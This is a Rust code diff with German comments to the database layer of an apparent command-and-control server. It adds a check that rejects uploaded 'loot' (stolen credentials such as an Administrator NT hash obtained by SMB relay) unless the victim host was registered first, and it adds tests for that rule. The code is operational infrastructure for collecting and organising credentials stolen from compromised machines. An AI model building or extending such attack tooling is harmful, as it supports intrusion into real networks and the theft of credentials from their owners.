@@ -71,6 +71,13 @@ struct TaskRow {
 pub enum DbError {
     #[error("rusqlite-Fehler: {0}")]
     Sqlite(#[from] rusqlite::Error),
+    /// Die Beute gehoert zu einem Host, den der Server nicht kennt.
+    ///
+    /// Eine Zeile, deren `host_id` der Server nie gesehen hat, kann der
+    /// Operator keinem Zielhost zuordnen — sie ist eine Waisenzeile. Der Host
+    /// muss vor seiner Beute registriert sein.
+    #[error("unbekannter Host {0} — der Host muss vor der Beute registriert sein")]
+    UnbekannterHost(String),
 }
 
 /// Die Server-Datenbank, thread-sicher um eine rusqlite-Connection.
@@ -277,6 +284,16 @@ impl Db {
     /// Diese Regel steht neben der Zeile, die sie betrifft, und nicht im
     /// Handler: sie ist eine Eigenschaft der Ablage, nicht des HTTP.
     pub fn upsert_secret(&self, upload: &c2::SecretUpload) -> Result<(), DbError> {
+        // Die Beute gehoert zu einem bekannten Host. Eine Zeile, deren
+        // `host_id` der Server nie gesehen hat, ist eine Waisenzeile: der
+        // Operator kann sie keinem Zielhost zuordnen. Der Host muss vor
+        // seiner Beute registriert sein.
+        //
+        // Diese Regel steht hier, neben der Zeile, die sie betrifft — nicht
+        // im Handler. Sie ist eine Eigenschaft der Ablage, nicht des HTTP.
+        if !self.host_existiert(&upload.host_id)? {
+            return Err(DbError::UnbekannterHost(upload.host_id.clone()));
+        }
         let sealed_password = upload.sealed_password.clone().unwrap_or_default();
         let password = if sealed_password.is_empty() {
             upload.password.clone()
@@ -294,6 +311,14 @@ impl Db {
             versiegelt: sealed_password,
         };
         self.upsert_secret_row(&row)
+    }
+
+    /// Ob der Server den Host kennt.
+    fn host_existiert(&self, host_id: &str) -> Result<bool, DbError> {
+        let conn = self.conn.lock().unwrap();
+        let mut stmt = conn.prepare("SELECT 1 FROM hosts WHERE id = ?1")?;
+        let mut rows = stmt.query([host_id])?;
+        Ok(rows.next()?.is_some())
     }
 
     fn upsert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
@@ -580,6 +605,64 @@ mod tests {
         std::fs::remove_file(&path).ok();
     }
 
+    /// Registriert einen Host beim Server.
+    ///
+    /// Die Beute gehoert zu einem bekannten Host — ohne diese Zeile lehnt
+    /// `upsert_secret` jeden Upload ab.
+    fn registriere(db: &Db, host_id: &str) {
+        db.upsert_host(&c2::RegisterRequest {
+            host_id: host_id.into(),
+            ip: host_id.into(),
+            hostname: None,
+            os: None,
+            status: None,
+            sealed_master: None,
+            master_key: None,
+        })
+        .expect("Host registrieren");
+    }
+
+    /// Beute ohne bekannten Host wird abgewiesen.
+    ///
+    /// Eine Waisenzeile kann der Operator keinem Zielhost zuordnen.
+    #[test]
+    fn eine_beute_ohne_bekannten_host_wird_abgewiesen() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("kx-secret-waise-{}.db", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+
+        let upload = c2::SecretUpload {
+            host_id: "10.0.0.5".into(),
+            cred_type: "nt_hash".into(),
+            username: "Administrator".into(),
+            password: String::new(),
+            source: Some("smb_relay".into()),
+            master_key: None,
+            sealed_password: None,
+        }
+        .mit_versiegeltem_passwort(Some("kx1:siegel".into()));
+
+        let fehler = db
+            .upsert_secret(&upload)
+            .expect_err("der Upload muss abgewiesen werden");
+        assert!(
+            matches!(fehler, DbError::UnbekannterHost(ref id) if id == "10.0.0.5"),
+            "unerwarteter Fehler: {fehler}"
+        );
+        assert!(
+            db.list_secrets().expect("secrets").is_empty(),
+            "die Waisenzeile liegt trotzdem in der Datenbank"
+        );
+
+        // Sobald der Host bekannt ist, geht die Beute durch.
+        registriere(&db, "10.0.0.5");
+        db.upsert_secret(&upload)
+            .expect("Upload nach der Registrierung");
+        assert_eq!(db.list_secrets().expect("secrets").len(), 1);
+
+        std::fs::remove_file(&path).ok();
+    }
+
     #[test]
     fn secret_row_maps_to_wire_secret() {
         let row = SecretRow {
@@ -606,6 +689,7 @@ mod tests {
         let dir = std::env::temp_dir();
         let path = dir.join(format!("kx-secret-upsert-{}.db", uuid::Uuid::new_v4()));
         let db = Db::open(&path).expect("db");
+        registriere(&db, "10.0.0.5");
 
         let upload = c2::SecretUpload {
             host_id: "10.0.0.5".into(),
@@ -685,6 +769,7 @@ mod tests {
         let dir = std::env::temp_dir();
         let path = dir.join(format!("kx-secret-andere-{}.db", uuid::Uuid::new_v4()));
         let db = Db::open(&path).expect("db");
+        registriere(&db, "10.0.0.5");
 
         let upload = c2::SecretUpload {
             host_id: "10.0.0.5".into(),
